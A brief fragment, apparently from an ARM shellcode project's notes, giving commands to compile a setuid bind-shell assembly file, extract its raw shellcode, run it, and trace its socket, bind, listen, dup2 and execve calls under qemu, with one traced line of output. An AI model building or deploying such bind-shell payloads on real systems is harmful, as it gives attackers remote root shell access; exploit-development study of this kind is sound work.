...
Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static setuid_bind_shell.s -o ./setuid_bind_shell.elf
Dump shellcode :
	$ arm-linux-gnueabi-objcopy --dump-section .text=setuid_bind_shell.raw ./setuid_bind_shell.elf
Run            :
	$ ./setuid_bind_shell.elf
...
~~ TRACING SYSCALLS
$ strace -X raw -e socket,bind,setsockopt,listen,accept,dup2,execve qemu-arm-static -L /usr/arm-linux-gnueabi ./setuid_bind_shell.elf
socket(0x2, 0x1, 0)                     = 3
